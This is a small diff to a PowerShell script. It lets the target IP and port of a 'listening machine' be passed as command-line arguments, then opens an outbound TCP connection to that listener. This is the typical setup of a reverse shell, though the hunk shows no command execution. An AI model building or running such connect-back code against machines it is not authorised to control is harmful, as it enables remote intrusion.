@@ -1,6 +1,11 @@
 $clientIP = "192.168.1.2" # IP Address of the listening machine
 $clientPort = 55555 # Port Number of the listening machine
 
+if ($args.Length -eq 2) { # Set client IP and Port as command line arguments
+    $clientIP = $args[0]
+    $clientPort = $args[1]
+}
+
 $socket = New-Object System.Net.Sockets.TcpClient # Create a new TCP socket
 $socket.Connect($clientIP, $clientPort) # Connect to the listening machine on the specified port
 
